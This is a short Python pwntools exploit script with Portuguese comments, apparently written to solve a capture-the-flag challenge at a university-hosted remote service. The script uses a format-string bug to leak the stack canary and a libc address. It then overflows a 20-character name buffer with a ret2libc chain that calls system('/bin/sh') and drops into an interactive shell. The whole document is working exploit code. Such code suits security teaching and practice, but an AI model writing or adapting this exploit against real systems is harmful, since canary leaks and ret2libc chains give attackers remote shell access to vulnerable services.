from pwn import *

LOCAL = False

# Offset de referência da biblioteca
reference_lib_offset = 0xf7daa519 - 0xf7d89000
# Offset da função system na biblioteca
system_lib_offset = 0x48150
# Offset da string "/bin/sh" na biblioteca
sh_lib_offset = 0x1bd0f5

def send_message(p, message):
    p.recvuntil(b">")
    p.sendline(b"e")
    p.recvuntil(b"Insert your name (max 20 chars): ")
    p.sendline(message)
    answer = p.recvline()
    p.recvuntil(b"Insert your message: ")
    p.sendline(b"")
    return answer

if LOCAL:
    pause()
else:
    p = remote("ctf-sp.dcc.fc.up.pt", 4002)

# Envia a primeira mensagem para obter o valor do canário e um valor de referência
first_message = send_message(p, b"%8$x-%11$x")

canary, reference_val = [int(val, 16) for val in first_message.split(b'-')]

# Calcula a base da biblioteca
lib_base = reference_val - reference_lib_offset
# Calcula os endereços da função system e da string "/bin/sh"
address_system = lib_base + system_lib_offset
address_sh = lib_base + sh_lib_offset

# Monta a segunda mensagem com os valores calculados
second_message = flat(b"A"*20, canary + 1, b"A"*8, address_system, b"A"*4, address_sh)

send_message(p, second_message)

send_message(p, b"A"*19)

p.interactive()
